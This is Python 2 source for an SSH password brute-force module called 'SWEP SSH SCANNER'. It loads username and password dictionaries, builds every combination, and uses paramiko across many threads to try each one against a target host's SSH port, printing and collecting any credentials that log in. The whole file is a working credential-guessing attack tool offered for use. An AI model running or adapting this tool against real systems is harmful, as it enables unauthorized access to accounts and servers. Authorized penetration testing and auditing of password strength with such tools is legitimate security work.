import paramiko
import threading
import queue
import socket
import os
import time


def info():
    info = {
        'name': 'ssh',
        'path': 'SSHPasswordScanner',
        'fullname': 'SWEP SSH SCANNER',
        'description': 'A simple SSH Password bruteforce tool',
        'parameters': {
            'Url': 'Target URL.',
            'Address': 'Target IP.',
            'Port': 'Target Port',
            'Username': 'Username.',
            'Password': 'Password.',
            'UsernameFile': 'Username file.',
            'PasswordFile': 'Password file.',
            'UserPassFile': 'Username and password file ,split with ":".',
            'Thread': 'Threads. Default: 10',
            'Timeout': 'Connection timeout. Default: 3'

        },
        'author': 'BERACHERS security',
        'date': '2019-01-28'
    }
    return info


class Scanner():
    def __init__(self):
        self.Url = None
        self.Address = None
        self.Port = 22
        self.Thread = 10
        self.Timeout = 3
        self.UsernameFile = None
        self.PasswordFile = None
        self.Username = None
        self.Password = None
        self.UserPassFile = None
        self.UserPassList = []
        self.TaskList = []
        self.Time = 0
        self.Status = True
        self.Queue = queue.Queue()
        self.IdentifyList = []
        pass


    def Scan(self):
        self.GetAddress()
        if not self.Address:
            print '[!] Address not found, quitting.'
            return
        if not self.TestConnect():
            print '[!] Failed to connect to target, quitting.'
            return
        if not self.LoadDict():
            print '[!] Failed to load dictionary, quitting.'
            return
        try:
            for item in self.UserPassList:
                self.Queue.put(item)
            self.Status = True
            self.LoadCounter()
            while True:
                if len(self.TaskList) < int(self.Thread):
                    u, p = self.Queue.get()
                    thread = threading.Thread(target=self.PasswordChecker, args=[u, p])
                    thread.start()
                    self.TaskList.append(thread)
                    if not self.Queue.qsize():
                        self.Status = False
                        print '[*] Scan completed, synchronizing tasks.'
                        thread.join()
                        break
        except Exception, e:
            print '[!] Failed to check SSH password: %s' %(str(e))
        except KeyboardInterrupt:
            print '[*] User stop.'
        if len(self.IdentifyList):
            print '[+] Total %s identify found.'
            print '[*] Incoming identify.'
            for item in self.IdentifyList:
                print ' |    %s:%s' %(item[0], item[1])
            print '[*] Identify output completed.'
        else:
            print '[*] No identify found.'
        return self.IdentifyList

    def GetAddress(self):
        if self.Address:
            return
        try:
            self.Address = socket.gethostbyname(self.Url)
        except socket.gaierror, e:
            print '[!] Failed to get target address: %s' %(str(e))
        return


    def PasswordChecker(self, username, password):
        sess = paramiko.SSHClient()
        sess.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        try:
            sess.connect(self.Address, int(self.Port), username, password, timeout=int(self.Timeout))
        except paramiko.SSHException, e:
            return
        print '[+] Password found: %s: %s' %(username, password)
        self.IdentifyList.append([username, password])
        sess.close()
        del sess
        return


    def TestConnect(self):
        try:
            sess = socket.socket(2, 1)
            sess.settimeout(3)
            sess.connect((self.Address, int(self.Port)))
        except Exception:
            return
        return 1


    def LoadDict(self):
        UserDict = []
        PassDict = []
        NewUserDict = []
        NewPassDict = []
        try:
            if self.UserPassFile:
                if not os.path.isfile(self.UserPassFile):
                    print '[!] Failed to open UserPass dictionary.'
                    return
                for item in open(self.UserPassFile).read().split('\n'):
                    UserPassPair = item.split(':')
                    if not UserPassPair:
                        continue
                    if len(UserPassPair) == 1:
                        UserPassPair.append('')
                    UserDict.append(UserPassPair[0])
                    PassDict.append(UserPassPair[1])
            else:
                if not self.Username:
                    if not os.path.isfile(str(self.UsernameFile)):
                        print '[!] Failed to load username file.'
                        return
                    for item in open(self.UsernameFile).read().split('\n'):
                        UserDict.append(item)
                else:
                    UserDict.append(self.Username)
                if not self.Password:
                    if not os.path.isfile(str(self.PasswordFile)):
                        print '[!] Failed to load password file.'
                        return
                    for item in open(self.PasswordFile).read().split('\n'):
                        PassDict.append(item)
                else:
                    PassDict.append(self.Password)
            for item in UserDict:
                if item not in NewUserDict:
                    NewUserDict.append(item)
            for item in PassDict:
                if item not in NewPassDict:
                    NewPassDict.append(item)
            UserDict = NewUserDict
            PassDict = NewPassDict
            print '[*] Loaded %i username(s), %i password(s).' %(len(UserDict), len(PassDict))
            for username in UserDict:
                for password in PassDict:
                    self.UserPassList.append([username, password])
            print '[*] Total %i trys.' %(len(self.UserPassList))
        except Exception, e:
            print '[!] Failed to load dictionary: %s' %(str(e))
            return
        return 1


    def TaskChecker(self):
        while self.Status:
            for item in self.TaskList:
                if not item.isAlive():
                    self.TaskList.remove(item)


    def ThreadChecker(self):
        while self.Status:
            time.sleep(5)
            print '[*] %i second(s), %i thread(s) running, %i item(s) left.' %(self.Time, len(self.TaskList), self.Queue.qsize())


    def Timer(self):
        while self.Status:
            time.sleep(1)
            self.Time += 1


    def LoadCounter(self):
        timer = threading.Thread(target=self.Timer)
        timer.setDaemon(True)
        taskchecker = threading.Thread(target=self.TaskChecker)
        taskchecker.setDaemon(True)
        threadchecker = threading.Thread(target=self.ThreadChecker)
        threadchecker.setDaemon(True)
        timer.start()
        taskchecker.start()
        threadchecker.start()


    def info(self):
        InformationList = info()
        args = InformationList['parameters']
        print '[*] Incoming scanner information:'
        print '[*] Scanner name: %s' %(InformationList['name'])
        print ' |   %s' %(InformationList['fullname'])
        print ' |   Description: %s' %(InformationList['description'])
        print ' |   Author: %s' %(InformationList['author'])
        print ' |   Date: %s' %(InformationList['date'])
        print ' |   Arguments: Total %i' %(len(args))
        print ' |    |  NAME        DESCRIPTION'
        print ' |    |  ----        `-----------'
        for item in args.keys():
            print ' |    |  %s%s' %(item.ljust(12), args[item])
        print ' |'
        print '[*] Scanner information end.'


def test():
    scanner = Scanner()
    scanner.Url = 'localhost'
    scanner.Port = 22
    scanner.Thread = 10
    scanner.UsernameFile = ''
    scanner.PasswordFile = ''
    scanner.Scan()
